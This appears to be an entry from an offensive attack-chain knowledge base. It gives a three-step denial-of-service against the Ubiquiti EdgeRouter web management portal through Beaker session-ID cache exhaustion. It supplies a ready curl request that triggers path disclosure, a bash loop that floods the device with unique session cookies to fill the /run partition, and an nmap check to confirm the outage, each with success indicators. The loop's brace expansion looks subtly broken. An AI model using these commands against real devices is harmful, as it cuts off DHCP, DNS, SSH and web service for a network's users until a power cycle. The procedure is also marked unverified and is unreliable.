---
tags:
  - dos
  - resource-exhaustion
  - path-disclosure
  - ubiquiti
  - edgerouter
  - beaker
type: attack_chain
tools:
  - '[[tools/nmap]]'
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Linux
  - Embedded (EdgeRouter)
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Trigger-Path-Disclosure-with-Long-Session-ID]]'
  - '[[procedures/Exhaust-Run-Partition-with-Multiple-Short-Session-IDs]]'
  - '[[procedures/Verify-DoS-with-Nmap-Scan]]'
step_count: 3
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:48.357Z'
description: >-
  Multi-stage attack exploiting Beaker session management in Ubiquiti EdgeRouter
  to disclose paths and exhaust /run partition, leading to full device
  denial-of-service.
skill_level: intermediate
impact_level: high
id: db706897-c48a-41ef-bef7-4ae58ed7f020
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
  - '[[File and Directory Discovery]]'
---
# DoS via Beaker Session ID Cache Exhaustion and Path Disclosure in EdgeRouter Web Portal

Multi-stage attack chain demonstrating exploitation of Beaker session management in the Ubiquiti EdgeMax (EdgeRouter) web management portal to first disclose internal paths and then exhaust the /run partition, resulting in complete device denial-of-service affecting web, SSH, DHCP, and other services.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10-30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Path Disclosure via Long Session ID] --> B[Resource Exhaustion via Multiple Short Session IDs]
    B --> C[DoS Verification and Full Impact]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/nmap]]
- HTTP client (e.g., curl or browser with cookie manipulation)

### Target Environment

- Ubiquiti EdgeMax/EdgeRouter running v1.10.6 or similar
- Linux-based embedded platform
- Services: Web Management Portal on ports 80 (HTTP), 443 (HTTPS); SSH; DHCP (67); DNS (53)
- Tech stack: Python with Beaker session management

### Initial Access Requirements

- Network access to the router's management interface (e.g., local LAN, 192.168.1.1)
- No credentials required for unauthenticated exploitation
- Ability to send crafted HTTP requests with custom cookies

## Detailed Attack Procedures

### Step 1: Trigger Path Disclosure
procedure: [[procedures/Trigger-Path-Disclosure-with-Long-Session-ID]]

**Objective**: Exploit long session ID to force an error page revealing internal file paths, such as /var/run/beaker/container_file/.

**Instructions**: Craft and send an HTTP GET request to the root path (/) with a beaker.session.id cookie exceeding 249 characters to trigger a Python traceback or 500 error exposing paths.

Use [[commands/send-long-session-id-cookie-for-path-disclosure]] to send the request:

```bash
curl -X GET "http://192.168.1.1/" -H "Cookie: beaker.session.id=v8iG24fDKn8x5uD3V2uICZA1FJEoUJpqH5VTa03xB5blDRNOe5AfFp2GNIBpDX8th1IO8sS5ejsz4Swm175nUvipwU211S4n4RtCv0A6r18fsgJbrrbmhFT9k2cAXF3yyg0Uu0B0wPOWP7BOrMVnXp44aHoXSfJ06ZXk7HrD5J5R9AZIgQLmGutM9ESNxw3CVJtW4Rfxeh7JE2AD04B3g78FxRgBxY82I2Gzf6ZPMsc39d37LM90dd9cFA" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
```

**Expected Output**: 500 error page or Python traceback displaying internal paths like /var/run/beaker/container_file/.

**Success Indicators**:
- Error response contains full path disclosure (e.g., mentions /var/run/beaker/container_file/)
- No successful session handling; traceback visible

### Step 2: Exhaust /run Partition
procedure: [[procedures/Exhaust-Run-Partition-with-Multiple-Short-Session-IDs]]

**Objective**: Send numerous requests with unique short session IDs (1-249 characters) to create cache files in /var/run/beaker/container_file/, filling the /run partition to ~50% or more, leading to log filling and service degradation.

**Instructions**: Iteratively generate and send GET requests to / with unique beaker.session.id values (e.g., incrementing strings of varying lengths up to 15681 iterations). Each request creates a *.cache file without cleanup, exhausting disk space.

Script a loop using [[commands/send-long-session-id-cookie-for-path-disclosure]] adapted for short IDs, or use a tool like Burp Intruder for automation:

```bash
for i in {1..15681}; do
  session_id=$(printf 'a%.0s' {1..$((i%249+1))})
  curl -X GET "http://192.168.1.1/" -H "Cookie: beaker.session.id=$session_id" -H "User-Agent: Mozilla/5.0" --silent
  echo "Iteration $i completed"
done
```

Monitor /run utilization via SSH if accessible initially, but continue until errors in /var/log about failed writes appear.

**Expected Output**: Device logs fill with errors; /run reaches 50%+ utilization; services begin failing.

**Success Indicators**:
- Cache files accumulate in /var/run/beaker/container_file/
- /var/log overflows with write failure errors
- Web portal becomes unresponsive

### Step 3: Verify DoS Impact
procedure: [[procedures/Verify-DoS-with-Nmap-Scan]]

**Objective**: Confirm denial-of-service by scanning for open ports while verifying services like DHCP, SSH, and web are non-responsive, requiring power cycle for recovery.

**Instructions**: After exhaustion, use [[commands/nmap-scan-for-service-verification]] to probe the network and router ports.

```bash
nmap -sS -p 53,67,80,443 192.168.1.0/24
```

Attempt connections to affected services (e.g., SSH to port 22, DHCP lease requests) to confirm unresponsiveness.

**Expected Output**: Ports reported open (e.g., 53 DNS, 67 DHCP, 80 HTTP, 443 HTTPS on 192.168.1.1), but no responses to connection attempts.

**Success Indicators**:
- Ports appear open in scan but services fail (e.g., no SSH login, no DHCP response)
- Device requires power cycle or manual cache deletion for recovery

## Attack Chain Summary

### Key Achievements

1. Exposed internal paths via error handling flaw, aiding reconnaissance.
2. Achieved resource exhaustion DoS by flooding session cache without bounds.
3. Rendered the EdgeRouter completely unresponsive to critical services until reboot.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[OS Exhaustion Flood]] OS Exhaustion Floods
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Impact]] Impact

---

*Last updated: 2023-10-01T00:00:00Z*
